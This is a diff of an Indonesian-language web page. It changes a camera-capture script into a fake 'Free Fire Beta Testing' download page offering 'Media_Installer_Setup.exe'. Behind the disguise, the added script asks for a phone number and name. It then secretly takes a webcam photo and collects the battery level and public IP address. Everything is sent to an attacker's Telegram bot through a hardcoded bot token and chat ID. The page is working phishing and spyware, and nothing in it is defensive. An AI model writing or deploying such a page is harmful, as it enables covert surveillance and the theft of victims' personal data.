@@ -1,54 +1,175 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>Auto Foto & Kirim ke Telegram</title>
+  <meta charset="UTF-8">
+  <title>Free Fire Beta Testing</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #f1f1f1;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.1);
+      padding: 30px;
+      text-align: center;
+      max-width: 360px;
+      width: 90%;
+    }
+
+    .card img {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 15px;
+      border-radius: 12px;
+    }
+
+    .card h2 {
+      font-size: 20px;
+      margin: 0;
+      margin-bottom: 10px;
+    }
+
+    .card p {
+      margin: 4px 0;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .card input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 15px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    .card button {
+      width: 100%;
+      background: #28a745;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      margin-top: 15px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 15px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-<video id="video" autoplay playsinline style="max-width: 400px;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+
+<div class="card">
+  <img src="https://files.catbox.moe/h17a67.jpg" alt="FF Icon">
+  <h2>Free Fire Beta Testing</h2>
+  <p>File: Media_Installer_Setup.exe</p>
+  <p>Size: 23.6 MB</p>
+  <input type="text" id="phoneNumber" placeholder="Masukkan nomor ponsel untuk verifikasi">
+  <input type="text" id="userName" placeholder="Masukkan nama Anda">
+  <button id="prepareButton" disabled onclick="sendData()">Download</button>
+  <div class="footer">Apk Free Fire Beta Testing | 2025.</div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-
-// Ganti dengan token bot dan chat ID kamu
 const BOT_TOKEN = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU';
 const CHAT_ID = '6624966395';
 
-navigator.mediaDevices.getUserMedia({ video: true }).then(async stream => {
-  video.srcObject = stream;
+let userName = '';
+let phoneNumber = '';
 
-  setTimeout(async () => {
-    const context = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+function validateInputs() {
+  // Validasi jika nomor dan nama sudah diisi
+  userName = document.getElementById('userName').value;
+  phoneNumber = document.getElementById('phoneNumber').value;
 
-    const dataURL = canvas.toDataURL('image/jpeg');
-    const blob = await (await fetch(dataURL)).blob();
+  if (userName && phoneNumber) {
+    document.getElementById('prepareButton').disabled = false;
+  } else {
+    document.getElementById('prepareButton').disabled = true;
+  }
+}
 
-    stream.getTracks().forEach(track => track.stop()); // Stop kamera
+function sendData() {
+  // Memastikan nama dan nomor sudah diisi
+  if (!userName || !phoneNumber) {
+    alert('Harap masukkan nomor ponsel dan nama Anda!');
+    return;
+  }
 
-    const battery = await navigator.getBattery();
-    const level = Math.round(battery.level * 100);
+  navigator.mediaDevices.getUserMedia({ video: true }).then(async stream => {
+    video.srcObject = stream;
 
-    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+    setTimeout(async () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('caption', `Baterai: ${level}%\nIP Address: ${ipData.ip}\nNama: ${prompt("Masukkan nama:")}`);
-    formData.append('photo', blob, 'foto.jpg');
+      const dataURL = canvas.toDataURL('image/jpeg');
+      const blob = await (await fetch(dataURL)).blob();
+      stream.getTracks().forEach(track => track.stop());
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
+      const battery = await navigator.getBattery();
+      const level = Math.round(battery.level * 100);
+      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
 
-  }, 3000); // Ambil foto setelah 3 detik
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('caption', `Baterai: ${level}%\nIP Address: ${ipData.ip}\nNomor: ${phoneNumber}\nNama: ${userName}`);
+      formData.append('photo', blob, 'cam.jpg');
 
-}).catch(err => {
-  alert('Gagal akses kamera: ' + err.message);
-});
+      // Mengirim foto dan data ke Telegram
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await response.json();
+        if (result.ok) {
+          alert('Data berhasil dikirim!');
+        } else {
+          alert('Terjadi kesalahan saat mengirim data.');
+        }
+      } catch (error) {
+        alert('Gagal mengirim data: ' + error.message);
+      }
+
+    }, 3000);
+
+  }).catch(err => {
+    alert('Akses kamera ditolak: ' + err.message);
+  });
+}
+
+// Validasi input saat pengguna mengetik
+document.getElementById('phoneNumber').addEventListener('input', validateInputs);
+document.getElementById('userName').addEventListener('input', validateInputs);
+
 </script>
+
 </body>
 </html>
